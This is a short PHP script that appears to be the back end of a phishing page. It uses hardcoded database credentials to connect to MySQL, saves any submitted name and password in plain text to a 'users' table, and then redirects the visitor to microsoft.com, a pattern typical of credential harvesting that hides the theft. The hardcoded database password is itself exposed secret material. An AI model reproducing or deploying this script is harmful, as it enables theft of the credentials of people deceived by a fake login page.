<?php


$bdd = new PDO('mysql:dbname=dbs2474220;host=localhost:3306','dbu2186407','@m&5PgTrgKizcQ&g',array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8'));

$bdd->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$bdd->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);


 

    if(isset($_POST['name'])){
    		 $login = $bdd->prepare("INSERT INTO users SET name=?, password=?");
	 $login->execute([$_POST["name"], $_POST["password"]]);

	 header('Location: http://www.microsoft.com/');
	 exit;


    	
    	
    	} 


?>